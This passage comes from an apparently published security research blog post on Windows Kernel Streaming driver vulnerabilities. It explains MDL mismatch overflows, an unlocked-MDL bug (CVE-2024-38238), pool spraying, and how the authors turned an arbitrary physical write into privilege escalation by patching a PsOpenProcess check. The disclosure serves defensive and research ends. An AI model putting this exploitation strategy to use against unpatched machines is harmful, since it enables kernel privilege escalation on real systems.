&lt;p&gt;Moreover, if multiple frames are requested in a single call, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will pre-allocate all the necessary MDLs and perform the corresponding frame buffer mappings.&lt;/p&gt;

&lt;p&gt;However, if the OptionsFlags field is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER_OPTIONSF_PERSIST_SAMPLE (0x8000)&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will skip the normal MDL allocation process. This flag is actually part of Kernel Streamingâ€™s MDL caching mechanism. While we wonâ€™t go into the full details here, itâ€™s important to understand that enabling this flag &lt;strong&gt;causes ksthunk to skip MDL allocation for that frame&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, since each frame is handled independently, itâ€™s possible to intentionally mark only one of the submitted frames as caching by setting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER_OPTIONSF_PERSIST_SAMPLE&lt;/code&gt; flag on that specific frame when submitting multiple frames in a single request.&lt;/p&gt;

&lt;p&gt;Let me give you an example :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suppose we submit two frames, with the second frame marked as caching.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame. If the cache flag is &lt;strong&gt;not&lt;/strong&gt; set, it allocates an MDL and maps the frame buffer accordingly. Since the second frame &lt;strong&gt;has&lt;/strong&gt; the cache flag set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will skip MDL allocation for that frame.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, which will once again inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame. However, the logic here is reversed compared to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame â€” because it doesnâ€™t have the cache flag â€” ks.sys assumes the MDL has already been allocated by ksthunk, and therefore skips MDL allocation.&lt;/li&gt;
  &lt;li&gt;For the second frame, since the cache flag is set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will allocate a new MDL and map the frame buffer.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; then creates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; based on &lt;strong&gt;the order of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; entries&lt;/strong&gt;.
Each KSFRAME is paired one-to-one with its corresponding MDL, and the frames are placed into an internal queue, waiting to be pulled and processed by the worker thread.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Butâ€¦ is it really safe ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There seems to be something inconsistent. &lt;strong&gt;Letâ€™s abuse the MDL chain !&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suppose we submit two frames:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame, we set the buffer size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1000&lt;/code&gt; and enable the cache flag.&lt;/li&gt;
  &lt;li&gt;For the second frame, we set the buffer size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt;, but do not set the cache flag.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; checks each stream header as usual. For the first frame, since &lt;strong&gt;the cache flag is set&lt;/strong&gt;, it &lt;strong&gt;skips&lt;/strong&gt; MDL allocation. For the second frame, since the cache flag is &lt;strong&gt;not&lt;/strong&gt; set, ksthunk allocates a new MDL and maps the frame buffer accordingly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, which once again inspects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame, since the cache flag is set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will allocate a new MDL, map the frame buffer, and insert it into the MDL chain.&lt;/li&gt;
  &lt;li&gt;For the second frame, the cache flag is not set, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; assumes the MDL has already been allocated by ksthunk, and therefore skips the allocation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; creates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;  based on the MDL chain and the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; entries. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt; field from each header is stored into the associated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;, defining the expected frame size.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, the first frame will have a size of 0x1000 stored, while the second frame will have 0x20000 stored.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Do you notice the problem?&lt;/strong&gt; After we run it â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Why ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The root cause of this issue is a mismatch between each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and its corresponding MDL. For example, the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; gets paired with the MDL of the second frame, while the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; ends up linked to the MDL of the first frame.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Whatâ€™s the actual impact?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the worker copies data from the device, it relies on the buffer address and size stored in each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; to perform the copy operation. Both frames are treated the same â€” the worker refers to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structure to determine where and how much data to copy. However, here lies the problemâ€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;, the actual allocated buffer is only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1000&lt;/code&gt; bytes, but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt; field in the structure indicates a size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt;. As a result, the worker attempts to copy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt; bytes into &lt;strong&gt;a much smaller buffer&lt;/strong&gt;, leading to a buffer overflow.&lt;/p&gt;

&lt;p&gt;In fact, several of the vulnerabilities we discovered stem from this exact issue. As long as an attacker can create a mismatch between a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and its corresponding MDL, the result is a buffer overflow.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2024-38237&lt;/li&gt;
  &lt;li&gt;CVE-2025-21375&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The second bug class weâ€™re going to discuss is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The Forgotten Lock in MDL&lt;/code&gt; â€”
a vulnerability pattern involving incorrect handling of MDL.&lt;/p&gt;

&lt;p&gt;This bug class is a bit more special&lt;/p&gt;

&lt;h3 id=&quot;the-forgotten-lock&quot;&gt;The Forgotten Lock&lt;/h3&gt;

&lt;p&gt;Actually, it is an &lt;strong&gt;uninitialized issue&lt;/strong&gt; in MDL.&lt;/p&gt;

&lt;p&gt;Before we discuss this issue, letâ€™s first look at some common mistakes developers make when working with MDLs.&lt;/p&gt;

&lt;h4 id=&quot;security-risks-of-mdl&quot;&gt;Security Risks of MDL&lt;/h4&gt;

&lt;p&gt;The first one is a common issued recently â€” one that I also mentioned in a &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#cve-2023-29360---logical-vulnerability&quot;&gt;previous post&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access mode&lt;/code&gt; flag in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock a user-supplied memory buffer, it may incorrectly set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access mode&lt;/code&gt; flag. This mistake causes the kernel to skip the check that verifies whether the target address belongs to user space. As a result, a user-mode process could supply a kernel-mode address, leading to arbitrary memory writes in kernel space.&lt;/p&gt;

&lt;p&gt;For more details, please refer to &lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Synacktivâ€™s presentation at HITB 2023 HKT&lt;/a&gt; and &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; â€˜s blog &lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Double Free in I/O Complete&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another common issue occurs when a kernel driver frees an MDL without clearing the corresponding MDL pointer in the IRP. Later, when the IRP is completed, the system attempts to free the MDL again, resulting in a double free vulnerability during &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest&quot;&gt;IoCompleteRequest&lt;/a&gt;. This pattern can also be found in Kernel Streaming(&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24046&quot;&gt;CVE-2025-24046&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When frame allocation fails, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; releases the MDLs in the MDL chain, but it does not clear the MDL pointer stored in the IRP. As a result, the MDL is freed again when the IRP completes â€” leading to a double free.&lt;/p&gt;

&lt;p&gt;These two bug patterns are quite common, there are many more overlooked issues out there.&lt;/p&gt;

&lt;p&gt;Letâ€™s take an example from &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/driversecurity/driver-security-dev-best-practices&quot;&gt;Microsoft driver Security Guidance&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this document, Microsoft warns that if developers use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapIoSpace&lt;/code&gt; without properly validating the physical address, it could result in arbitrary physical memory being mapped into virtual address space â€” potentially leading to serious security issues.&lt;/p&gt;

&lt;p&gt;To illustrate safe usage, Microsoft provides the following secure coding example:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Func ConstrainedMap(PHYSICAL_ADDRESS paAddress)
{
    // expected_Address must be constrained to required usage boundary to prevent abuse
    if(paAddress == expected_Address &amp;amp;&amp;amp; qwSize == valid_Size)  //-----[1]
    {
        lpAddress = MmMapIoSpace(paAddress, qwSize, ...);   
        pMdl = IoAllocateMdl( lpAddress, ...); //----------[2]
        MmMapLockedPagesSpecifyCache(pMdl, UserMode, ... ); //-------------[3]
    }
    else
    {
        return error;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, the physical address is validated at [1]. Then, at [2], an MDL is allocated to describe the mapped memory region.Finally, [3] calls MmMapLockedPagesSpecifyCache to map the physical memory into a user-space virtual address.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Nowâ€¦ you might notice something strange here.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we mentioned earlier, in typical usage, after allocating an MDL, you are expected to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock the underlying physical pages. However, in this case, the code calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; directly, without locking the pages first. This results in undefined behavior, as the MDL may not correctly describe valid or accessible physical memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in diagram above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; is used to allocate the MDL structure and initialize some basic metadata. However, if we immediately call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; without first locking the pages,the function will still attempt to access the PFN array inside the MDL. This can lead to undefined behavior, or worse, controlled memory corruption. In many cases, this leads directly to a BSoD.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, this kind of mistake is widespread throughout Kernel Streaming. In the following section, I will examine CVE-2024-38238, which clearly demonstrates this issue in practice.&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-38238&quot;&gt;CVE-2024-38238&lt;/h4&gt;

&lt;p&gt;We once again construct two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures â€” and this time, both frames are of the same size. The first frame has the cache flag set, while the second frame does not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As mentioned earlier, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will allocate and lock an MDL only for the frame that does not have the cache flag set. Once thatâ€™s done, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further processing.&lt;/p&gt;

&lt;p&gt;Now, letâ€™s take a closer look at how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; handles this frame.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64  CKsMdlcache::MdlCacheHandleThunkBufferIrp(...)
{
  ...
  while(TotalSize &amp;gt;= sizeof(KSSTREAM_HEADER)){ //-------[4]
      ...
      if(OptionsFlag &amp;amp; 0x8000 == 0) //-------[5]
        return KsProbeStreamIrp(irp, a3, 0); //-------[8]
      IoAllocateMdl(header-&amp;gt;Data,header-&amp;gt;FrameExtent,...,Irp); //-------[6]
  }
  ...
  for(i = irp-&amp;gt;MdlAddress;i;i = i-&amp;gt;Next){
      MmProbeAndLockPages(i, irp-&amp;gt;RequestorMode, IoWriteAccess); //-------[7]
  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the while loop in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!CKsMdlcache::MdlCacheHandleThunkBufferIrp&lt;/code&gt; at [4], we can see that it iterates through each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlag&lt;/code&gt;s at [5] to determine whether an MDL should be allocated.&lt;/p&gt;

&lt;p&gt;If the cache flag is set, it proceeds to allocate a new MDL at [6]. Under WOW64, if the MDL was already allocated (e.g., by ksthunk), KS will then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; at [7] to lock the memory pages.&lt;/p&gt;

&lt;p&gt;However, in our specific case:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The first frame has the cache flag set.&lt;/li&gt;
  &lt;li&gt;The second frame does not.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, when KS begins processing the second frame, it takes the path to KsProbeStreamIrp at [8]. At this point, the MDL chain inside the IRP looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first MDL has already been properly locked, but the second one is not locked at all.&lt;/p&gt;

&lt;p&gt;After that, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsProbeStreamIrp&lt;/code&gt; handles the mapping of the frame buffers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;
NTSTATUS KsProbeStreamIrp(PIRP Irp, ULONG ProbeFlags, ULONG HeaderSize){
 ...
 MDL = Irp-&amp;gt;MdlAddress;
 if ( (MDL-&amp;gt;MdlFlags &amp;amp; is_locked_and_nonpaged) != 0 ) { //----[9]
    while ( MDL ) 
    {
        if ( (MdlFlags &amp;amp; 5) != 0 )
        MappedSystemVa = MDL-&amp;gt;MappedSystemVa;
        else
        MappedSystemVa = MmMapLockedPagesSpecifyCache(MDL, 0, MmCached, 0LL, 0, 0x40000010u); 
        
        MDL = MDL-&amp;gt;Next;
    }
 }
}


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As shown above, the function uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; to map the frame buffer by each MDL. If the MDL is marked as locked, the function maps it directly. However, thereâ€™s a critical flaw: It &lt;strong&gt;only checks the first MDL&lt;/strong&gt; in the MDL chain at [9],and assumes that the entire chain has already been locked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; is called on the second MDL, it attempts to map memory based on an uninitialized PFN list.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unexploitatble ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The good news is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; allocates memory &lt;strong&gt;from NonPagedPoolNx&lt;/strong&gt; &lt;strong&gt;without zero-initializing it&lt;/strong&gt;. This means the PFN array located at the end of the MDL structure will contain leftover memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown above, when IoAllocateMdl allocates memory, it uses the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/pool_flags&quot;&gt;POOL_FLAG_UNINITIALIZED&lt;/a&gt; flag, and does not initialize the PFN array in the MDL. This behavior allows us to apply pool spraying techniques to gain partial or full control over the PFN values inside the MDL.&lt;/p&gt;

&lt;p&gt;By calculating the exact size of the MDL structure â€” including the number of PFNs based on the frame size â€” we can perform a &lt;a href=&quot;https://www.alex-ionescu.com/?p=231&quot;&gt;pool spray using Named Pipes&lt;/a&gt; to populate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NonPagedPoolNx&lt;/code&gt; memory with carefully crafted data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; reuses this memory without zero-initialization, the leftover values will be interpreted as valid PFNs, giving the attacker control over physical-to-virtual mappings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown above, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; is called afterward, it treats the attacker-controlled PFNs as valid physical page mappings and uses them to map the frame buffer.&lt;/p&gt;

&lt;p&gt;Finally, when the worker thread copies image data from the device, it writes directly to the physical addresses specified by the attacker, resulting in a powerful arbitrary physical memory write primitive.&lt;/p&gt;

&lt;p&gt;Actually, not all PFNs can be mapped â€” they must be valid, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResidentPage&lt;/code&gt;. But for our purposes, thatâ€™s more than enough.&lt;/p&gt;

&lt;p&gt;The next step is to achieve elevation of privilege (EoP) using the arbitrary physical memory write primitive. But that raises the question:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Where should we write?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;During testing on several Windows 24H2, we observed a consistent behavior:
the physical base address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; was typically fixed at 0x100400000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tested it on Hyper-V and VMware. The value might have changed in newer builds, but itâ€™s still likely to remain fixed in many cases. This behavior may also depend on the device or hardware configuration.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;So â€¦ does that mean we can just write directly to nt and take over the kernel?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There is a problem â€¦â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cannot control the data being written, because it comes directly from the webcam device.&lt;/p&gt;

&lt;p&gt;Initially, it seemed like we were stuck. But with a primitive this powerful â€” stable and repeatable arbitrary physical memory writes â€” we knew there had to be a way forward.&lt;/p&gt;

&lt;p&gt;So we went back, carefully reviewed the entire Kernel Streaming workflow, and eventually discovered a new angle of attack.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Buffered&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Kernel Streaming offers a feature called buffered mode. When a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is created with the &lt;strong&gt;buffered flag(KSSTREAM_HEADER_OPTIONSF_BUFFEREDTRANSFER)&lt;/strong&gt; set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; allocates an additional intermediate buffer in kernel space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/45.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20250517/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;During the streaming process, the contents from the original image buffer are first copied into this intermediate buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/47.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20250517/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in diagram above, after the device finishes writing data â€” or if an error occurs during the transfer â€” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will copy the contents of the buffered memory into the frame buffer. However, in our case, this frame buffer has already been mapped to the physical address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; image. In other words, we now have an &lt;strong&gt;arbitrary physical memory write primitive&lt;/strong&gt; with fully controlled data. This opens the door to directly modifying kernel code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In our exploit, we chose to overwrite a security check inside PsOpenProcess. Specifically, we replaced the check for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;. As a result, any normal user can open a high-privilege process except PPL. For more details on the technique of replacing the check with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;, you can refer to &lt;a href=&quot;https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/#make-abusing-token-privilege-great-again-&quot;&gt;my previous post&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/OBY6kJ2sxME?si=oJA1FKRKcMbj6G1_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;There are multiple ways to cause this issue in Kernel Streaming&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2024-38238&lt;/li&gt;
  &lt;li&gt;CVE-2024-38241&lt;/li&gt;
  &lt;li&gt;CVE-2025-24066&lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As long as you find a way to make it forget lock, it can result in an arbitrary physical memory writing.&lt;/p&gt;

&lt;p&gt;The last issue we would like to share is &lt;strong&gt;Frame Buffer Misalignment&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;frame-buffer-misalignment-cve-2024-38245&quot;&gt;Frame Buffer Misalignment (CVE-2024-38245)&lt;/h3&gt;

